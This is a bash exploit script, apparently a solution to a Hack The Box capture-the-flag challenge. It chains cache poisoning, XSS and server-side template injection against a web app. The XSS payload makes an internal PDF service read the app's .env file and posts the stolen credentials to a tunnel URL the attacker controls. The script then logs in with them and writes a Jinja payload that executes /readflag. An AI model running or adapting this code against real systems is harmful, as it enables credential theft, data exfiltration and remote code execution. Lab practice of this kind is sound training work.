#!/bin/bash

# Cache poisoning + xxs + ssti

# dependencies
if ! hash pdftotext 2>/dev/null; then echo "Missing 'pdftotext'" ; exit 1; fi

HOST='localhost:1337'
HOST='94.237.59.180:56389'

# Force running the script in bash because the trap command bellow might fail on some default shells
if [ -z "${BASH:-}" ]; then exec bash "$0" "$@"; fi

TMP_LOG=$(mktemp)
HTTP_LOG=$(mktemp)
PORT=9999
# kill all background jobs when script exits
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT
echo + exposing port ${PORT} to the internet
http-server.py ${PORT} -k 1 -R 'Access-Control-Allow-Origin: *' -o "/tmp/http-out" >$HTTP_LOG & # https://github.com/orrors/cheat-sheets/blob/main/samples/http-server.py
serverpid=$!
ssh -R 80:localhost:${PORT} localhost.run -- --no-inject-http-proxy-headers >$TMP_LOG 2>&1 &
while ! PUBLIC_URL=$(grep 'https://.*life' -o $TMP_LOG) ; do sleep 0.1; done
echo + using $PUBLIC_URL

urlencode() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()));' ; }

echo + poisoning the cache
# simple example that injects an iframe of our server and serves it as pdf (didn't allow to load a file:// url)
# payload="<iframe src='$PUBLIC_URL' width=600px height=600px></iframe>"
# this payload calls the internal pdf generator server with a local file as URL to bypass
# loading a file:// restrictions from the XXS injection
payload="<img src=\"\" onerror=\"fetch('http://127.0.0.1:3002/generate?url=file:///app/services/web/.env').then(r=>r.blob()).then(b=>{let f=new FormData();f.append('file',b,'pwn.pdf');fetch('$PUBLIC_URL',{method:'POST',body:f});})\"/>"
curl -s "http://${HOST}/stats?period=1m&period=$(echo -n "$payload"|urlencode)" >/dev/null

echo + triggering poisoned cache exploit XSS
curl -s "http://${HOST}/generate-report" >/dev/null

echo + waiting to receive credentials
creds=$(pdftotext $(until grep 'pwn.pdf' $HTTP_LOG; do sleep 0.1; done | awk '{print$NF}') - | head -n2)
echo + got credentials $(env $creds envsubst <<< '$ENGINEER_USERNAME:$ENGINEER_PASSWORD')
auth="Authorization: Basic $(env $creds envsubst <<< '$ENGINEER_USERNAME:$ENGINEER_PASSWORD' | tr -d '\n' | base64)"

echo -n "+ creating polluted report: "
polutionpayload=$(jq -c <<EOF
{"title": "nope",
	"description": "{% block body %}{% endblock %} HITME {{dict.__mro__[1].__subclasses__()[337]('/readflag',stdout=-1).communicate()[0]}}",
	"file_path": "/app/services/web/templates/_template.html"
}
EOF
)
report_id=$(curl -s -X POST "http://${HOST}/report" -H "$auth" --json "$polutionpayload" | jq -r '.report_id')
echo ${report_id#POD-REPORT-}

echo + make requests until we dont hit the cached template and cause ssti
until curl -s "http://${HOST}" | grep -o 'HTB{[^}]*}'; do sleep 0.2; done

wait $serverpid
